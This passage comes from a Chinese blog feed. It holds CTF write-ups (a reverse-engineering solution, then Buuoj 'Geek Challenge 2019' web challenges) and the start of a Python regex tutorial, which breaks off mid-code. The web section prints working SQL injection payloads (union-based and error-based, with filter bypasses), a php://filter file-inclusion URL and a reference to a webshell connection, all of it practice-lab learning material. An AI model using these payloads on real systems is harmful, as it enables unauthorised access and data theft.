class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">cal</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> _a;</span><br><span class="line"><span class="keyword">double</span> var = <span class="number">0.0</span>;</span><br><span class="line">_a = a;</span><br><span class="line">a = <span class="built_in">pow</span>(a, b - <span class="number">1</span>);</span><br><span class="line">*(&amp;var + <span class="number">1</span>) = *(&amp;a + <span class="number">1</span>);</span><br><span class="line">var = a / <span class="built_in">exp</span>(_a);</span><br><span class="line"><span class="keyword">return</span> var;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> input_num;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">99999</span>; i++) &#123;</span><br><span class="line">input_num = i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"><span class="keyword">double</span> v16 = <span class="number">0.0</span>, v17 = <span class="number">0.0</span>, v18 = <span class="number">0.0</span>, v19 = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">int</span> num1 = <span class="number">0x13B03</span>, num2 = <span class="number">0x5A2</span>;</span><br><span class="line">v19 = (<span class="keyword">double</span>)((<span class="keyword">int</span>)input_num / <span class="number">0x305B</span>) + <span class="number">1.0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">v17 = v17 + cal(v18, v19) * <span class="number">0.001</span>;</span><br><span class="line">v18 = v18 + <span class="number">0.001</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (v18 &lt;= <span class="number">100.0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> v21 = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">double</span> v22 = (<span class="keyword">double</span>)((<span class="keyword">int</span>)input_num % <span class="number">0x305B</span>) + <span class="number">1.0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v16 = v16 + cal(v21, v22) * <span class="number">0.001</span>;</span><br><span class="line">v21 = v21 + <span class="number">0.001</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (v21 &lt;= <span class="number">100.0</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)(v17 + v17 + <span class="number">3.0</span>) == num1 &amp;&amp; (<span class="keyword">int</span>)(v16 + v16 + <span class="number">3.0</span>) == num2) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>, input_num);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面就比较简单了，首先将输入的数字转为<code>ascii</code>码，然后在后面追加<code>input_num*2</code>，一共追加5次，取前7位进行异或计算出一个<code>key</code>供后面使用</p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210409090040223.png" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Cipher = [<span class="number">8</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">2</span>, <span class="number">64</span>]</span><br><span class="line">key = list(map(ord,list(<span class="string">&quot;9903819&quot;</span>)))</span><br><span class="line">Plain = bytes(key[i]^Cipher[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>))</span><br><span class="line">print(Plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1ti5K3y</span></span><br></pre></td></tr></table></figure><p>后面就是一个标准的<code>RC4</code>加密</p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210409090441592.png" style="zoom: 67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">Cipher = bytes([<span class="number">178</span>, <span class="number">214</span>, <span class="number">142</span>, <span class="number">63</span>, <span class="number">170</span>, <span class="number">20</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">198</span>, <span class="number">6</span>])</span><br><span class="line">Key = <span class="string">b&#x27;1ti5K3y&#x27;</span></span><br><span class="line">rc4 = ARC4.new(Key)</span><br><span class="line">Plain = rc4.decrypt(Cipher)</span><br><span class="line">print(Plain)</span><br><span class="line"><span class="comment"># RC4_crypt0</span></span><br></pre></td></tr></table></figure><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210408214516158.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;红明谷-g0&quot;&gt;&lt;a href=&quot;#红明谷-g0&quot; class=&quot;headerlink&quot; title=&quot;红明谷-g0&quot;&gt;&lt;/a&gt;红明谷-g0&lt;/h2&gt;&lt;p&gt;看名字就是go语言题目，用&lt;code&gt;IDA-golang-helper&lt;/code&gt;还原符号表之后，看到只</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="re" scheme="http://example.com/categories/CTF/re/"/>
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Buuoj-极客大挑战 2019</title>
    <link href="http://example.com/2021/04/01/CTF/wp/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/"/>
    <id>http://example.com/2021/04/01/CTF/wp/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/</id>
    <published>2021-04-01T10:35:34.014Z</published>
    <updated>2021-05-07T11:26:36.838Z</updated>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码直接出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27; = &#x27;1 </span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><ul><li><p>首先查出单引号报错</p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212244339.png" style="zoom:67%;" /><p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212257596.png"></p></li><li><p>尝试用万能密码登录，发现只是一个无用的值，CMD5网站也无法破解，尝试其他方法</p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212341586.png" style="zoom: 67%;" /></li></ul><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212405252.png" style="zoom: 33%;" /><ul><li><p>尝试中断注入，联合注入查看其他信息可以看到用到了查询的第2，3个字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212657106.png" style="zoom: 33%;" /></li><li><p>获取当前数据库名，回显出当前数据库名为<code>geek</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401212841772.png"  style="zoom:33%;" /></li><li><p>查询数据库里面的表名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询所有表名</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">&#x27;database_name&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有列名</span></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= <span class="string">&#x27;表名&#x27;</span> <span class="keyword">and</span> table_schema= <span class="string">&#x27;数据库名&#x27;</span></span><br></pre></td></tr></table></figure><p>这里需要加上limit限制返回的列数，手工查出<code>geek</code>数据库下只有两个表：<code>geekuser</code>和<code>l0ve1ysq1</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">&#x27;geek&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure></li><li><p>查询表的列名，我当时是一个一个查的，看别人wp发现可以一次就全部查出来。。查出三个列名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= <span class="string">&#x27;表名&#x27;</span> <span class="keyword">and</span> table_schema= <span class="string">&#x27;数据库名&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;l0ve1ysq1&#x27;</span></span><br></pre></td></tr></table></figure><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210401213635841.png" style="zoom:33%;" /></li><li><p>获取数据库中信息</p><p>我先是手工查，后面加了一个where语句条件就直接出了。。运气好，网上师傅wp都是把表中的数据全部荡下来。学习一手</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,username,<span class="keyword">password</span> <span class="keyword">from</span> l0ve1ysq1 <span class="keyword">where</span> username = <span class="string">&#x27;flag&#x27;</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>网上师傅的做法，对mysql中的函数一点都不熟悉，边sqli边学mysql函数吧。。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">concat_ws</span>(<span class="number">0x7e</span>,username,<span class="keyword">password</span>)) <span class="keyword">from</span> geek.l0ve1ysq1 <span class="comment">#</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>考点：绕过特殊字符过滤</p><p>过滤了or,and,select,union,from这些关键字，用所有关键字用双写绕过，过程和LoveSQL过程一样</p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>考点：SQL报错注入</p><p>过滤了空格，等号，union，and等字符，主要难点在于空格过滤绕过，需要用括号来绕过</p><ul><li><p>爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;123&amp;password&#x3D;1&#39;^extractvalue(1,concat(0x5e,(select(database()))))%23</span><br></pre></td></tr></table></figure><p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210428215743886.png"></p></li><li><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;123&amp;password&#x3D;1&#39;^extractvalue(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23</span><br></pre></td></tr></table></figure><p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210428220751357.png"></p></li><li><p>爆字段名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;123&amp;password&#x3D;1%27^extractvalue(1,concat(0x5e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23</span><br></pre></td></tr></table></figure><p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210428221118649.png"></p></li><li><p>查flag</p><p>需要用left和right分别查左边和右边，然后个flag拼接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;123&amp;password&#x3D;1%27^extractvalue(1,concat(0x5e,(select(left(password,30))from(H4rDsq1)where(username)like(&#39;flag&#39;))))%23</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;123&amp;password&#x3D;1%27^extractvalue(1,concat(0x5e,(select(right(password,30))from(H4rDsq1)where(username)like(&#39;flag&#39;))))%23</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c36b7fc4-a9fe-4d02-97c6-d3c8b35ead69&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>SQL盲注</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>考点：本地文件包含，<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a></p><p>抓包抓到一个特殊文件，访问目录查看</p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210410170938938.png" style="zoom: 67%;" /><p>查看为本地文件包含，但是访问flag.php却什么也没有。使用php://filter协议对文件进行base64编码查看</p><p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210410171054700.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问后缀：secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p><code>flag.php</code>中的内容全部以base64编码的形式输出，在线解码得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MWZkYzRlMDItODU1MS00ZTY3LThkNzUtZmY3ZDkzZDJmNjg5fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;</span><br></pre></td></tr></table></figure><p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210410171524485.png"></p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>一句话木马，直接用蚁剑连接网站后台，<code>flag</code>在根目录</p><img src="%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019.assets/image-20210410171850050.png" style="zoom:80%;" /><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>考察网站常用备份后缀名，PHP的序列化与反序列化</p><p>首先提示了网站备份，用常用的网站备份字典爆破，爆破出<code>www.zip</code>，在后缀输入下载</p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>HTTP头部伪造，比较过程比较简单，主要是需要学习HTTP协议</p><p>/sbin/nologin</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;极客大挑战-2019-EasySQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-EasySQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]EasySQL&quot;&gt;&lt;/a&gt;[极客大挑战 2019]EasySQL&lt;/h2&gt;&lt;p&gt;万能密码</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="web" scheme="http://example.com/categories/CTF/web/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Python正则表达式练习</title>
    <link href="http://example.com/2021/03/26/Python/Python-re/"/>
    <id>http://example.com/2021/03/26/Python/Python-re/</id>
    <published>2021-03-26T11:41:35.228Z</published>
    <updated>2021-05-07T11:22:19.226Z</updated>
    
    <content type="html"><![CDATA[<h2 id="字符分类"><a href="#字符分类" class="headerlink" title="字符分类"></a>字符分类</h2><ul><li><code>\d</code> —– 0-9的任何数字</li><li><code>\D</code> —– 除开0-9的任何数字</li><li><code>\w</code> —– 任何字母，数字或下划线字符</li><li><code>\W</code> —– 除开字母，数字和下划线以外的任何字符</li><li><code>\s</code> —– 空格，制表符或换行符</li><li><code>\S</code> —– 除空格，制表符和换行符以外的任何字符</li></ul><h2 id="正则表达式基础"><a href="#正则表达式基础" class="headerlink" title="正则表达式基础"></a>正则表达式基础</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re <span class="comment"># 后面的代码中将默认引入</span></span><br><span class="line">msg = <span class="string">&#x27;My number is 415-555-4242 and 111-222-3333&#x27;</span> <span class="comment"># 下面例子中所使用的测试字符串</span></span><br></pre></td></tr></table></figure><ul><li><p>example_1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># search和findall的使用</span></span><br><span class="line">phoneNumRegex = re.compile(<span class="string">r&#x27;\d\d\d-\d\d\d-\d\d\d\d&#x27;</span>)</span><br><span class="line">mo_1 = phoneNumRegex.search(msg)</span><br><span class="line">mo_2 = phoneNumRegex.findall(msg)   <span class="comment"># findall方法返回一个列表，里面存储所有的正则匹配数据</span></span><br><span class="line">print(mo_1.group())</span><br><span class="line">print(mo_2[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search:  415-555-4242</span><br><span class="line">  findall:  [&#39;415-555-4242&#39;, &#39;111-222-3333&#39;]</span><br></pre></td></tr></table></figure></li><li><p>example_2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment"># 用括号分组</span></span><br><span class="line">  phoneNumRegex = re.compile(<span class="string">r&#x27;(\d\d\d)-(\d\d\d-\d\d\d\d)&#x27;</span>) <span class="comment"># 加括号会返回一个元祖</span></span><br><span class="line">mo_1 = phoneNumRegex.search(msg) <span class="comment"># 将正则匹配到的数据用括号给定的范围分组，打包成元祖</span></span><br><span class="line">  mo_2 = phoneNumRegex.findall(msg) <span class="comment"># findall将所有打包好的元祖存放到列表中</span></span><br><span class="line">  print(<span class="string">&#x27;mo_1 -&gt; group(0): &#x27;</span>,mo_1.group(<span class="number">0</span>))</span><br><span class="line">  print(<span class="string">&#x27;mo_1 -&gt; group(1) and group(2): &#x27;</span>,mo_1.group(<span class="number">1</span>),mo_1.group(<span class="number">2</span>))</span><br><span class="line">  print(<span class="string">&#x27;mo_2: &#x27;</span>,mo_2)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mo_1 -&gt; group(0):  415-555-4242</span><br><span class="line">mo_1 -&gt; group(1) and group(2):  415 555-4242</span><br><span class="line">mo_2:  [(&#39;415&#39;, &#39;555-4242&#39;), (&#39;111&#39;, &#39;222-3333&#39;)]</span><br></pre></td></tr></table></figure></li><li><p>example_3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 管道符号的使用</span></span><br><span class="line">msg = <span class="string">&#x27;Tina Fey and Batman.&#x27;</span></span><br><span class="line">heroRegex = re.compile(<span class="string">r&#x27;Batman|Tina Fey&#x27;</span>) <span class="comment"># |为管道符号，如果使用search方法只匹配到最近的一个，finddown会将可选项全部匹配</span></span><br><span class="line">mo_1 = heroRegex.search(msg)</span><br><span class="line">mo_2 = heroRegex.findall(msg)</span><br><span class="line">print(<span class="string">&#x27;mo_1.group(): &#x27;</span>,mo_1.group())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mo_1.group():  Tina Fey</span><br><span class="line">mo_2:  [&#39;Tina Fey&#39;, &#39;Batman&#39;]</span><br></pre></td></tr></table></figure></li><li><p>example_4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 管道符号多模式匹配</span></span><br><span class="line">batRegex = re.compile(<span class="string">r&#x27;Bat(man|mobile|copter|bat)&#x27;</span>) <span class="comment"># 若前缀相同则后缀部分可以用括号与管道符将其分开，减少输入</span></span><br><span class="line">mo = batRegex.search(<span class="string">&#x27;Batmobile lost a wheel&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;mo.group&#x27;</span>, mo.group())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mo.group():  Batmobile</span><br></pre></td></tr></table></figure></li><li><p>example_5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 问号实现可选匹配</span></span><br><span class="line">batRegex = re.compile(<span class="string">r&#x27;Bat(wo)?man&#x27;</span>) <span class="comment"># 简单来说，括号里面的存在匹配时就加上，不存在就忽略括号里面的</span></span><br><span class="line">mo = batRegex.search(<span class="string">&#x27;The Adventures of Batman&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;output: &#x27;</span>,mo.group())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">output:  Batman</span><br></pre></td></tr></table></figure></li><li><p>example_6</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  用*号实现多次匹配</span></span><br><span class="line">batRegex = re.compile(<span class="string">r&#x27;Bat(wo)*man&#x27;</span>) <span class="comment"># *号代表缺省</span></span><br><span class="line">mo = batRegex.search(<span class="string">&#x27;The Adventures of Batwowowowowoman&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;output: &#x27;</span>,mo.group())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">output:  Batwowowowowoman</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 用+号匹配一次或多次</span></span><br><span class="line">batRegex = re.compile(<span class="string">r&#x27;Bat(wo)+man&#x27;</span>) <span class="comment"># +号需要括号中的内容至少出现一次</span></span><br></pre></td></tr></table></figure></li><li><p>example_7</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用花括号匹配特定的次数</span></span><br><span class="line">haRegex = re.compile(<span class="string">r&#x27;Ha&#123;3&#125;&#x27;</span>) <span class="comment"># 指定三次</span></span><br><span class="line">haRegex = re.compile(<span class="string">r&#x27;Ha&#123;3,5&#125;&#x27;</span>) <span class="comment"># 有存在3-5个的都可以</span></span><br><span class="line">haRegex = re.compile(<span class="string">r&#x27;Ha&#123;,5&#125;&#x27;</span>) <span class="comment"># 匹配0-5个</span></span><br><span class="line">haRegex = re.compile(<span class="string">r&#x27;Ha&#123;3,&#125;&#x27;</span>) <span class="comment"># 匹配3或更多次 </span></span><br></pre></td></tr></table></figure></li><li><p>example_8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># example_6 贪心匹配和非贪心匹配 (好像在python3.8版本中被废弃？)</span></span><br><span class="line"><span class="comment">## 贪心</span></span><br><span class="line">greedyHaRegex = re.compile(<span class="string">r&#x27;(Ha)&#123;3, 5&#125;?&#x27;</span>)</span><br><span class="line">mo1 = greedyHaRegex.search(<span 